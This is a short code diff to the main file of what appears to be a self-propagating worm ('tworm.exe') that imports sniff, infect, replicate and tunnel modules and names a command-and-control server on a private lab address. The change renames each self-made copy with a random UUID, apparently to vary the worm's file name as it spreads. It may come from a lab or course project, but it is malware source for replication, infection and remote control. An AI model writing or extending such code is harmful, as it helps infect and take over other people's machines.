@@ -4,6 +4,7 @@ from sniff import sniff
 from infect import infect
 import tunnel as comm
 from replicate import replicate
+import uuid
 
 
 def main():
@@ -14,7 +15,11 @@ def main():
             file_path = "tworm.exe"
     else:
         file_path = sys.argv[0]
-    clone(file_path)
+    
+    if "exe" in file_path:
+        clone(file_path, str(uuid.uuid4()) + ".exe")
+    else:
+        clone(file_path, str(uuid.uuid4())+file_path)
     
     c2_server = "192.168.56.108"
     not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
@@ -47,11 +52,11 @@ def main():
                             
                             tunnel.close_client_connection(target_ip.address)
 
-def clone(file_path):
+def clone(file_path, filename):
     try:
         fullpath=os.getcwd()
         self_clone = replicate(file_path, fullpath)
-        self_clone.self_replicate(platform.system(),file_path)
+        self_clone.self_replicate(platform.system(),file_path, filename)
     except Exception as e:
         print("Clone Error: {}".format(e))
         
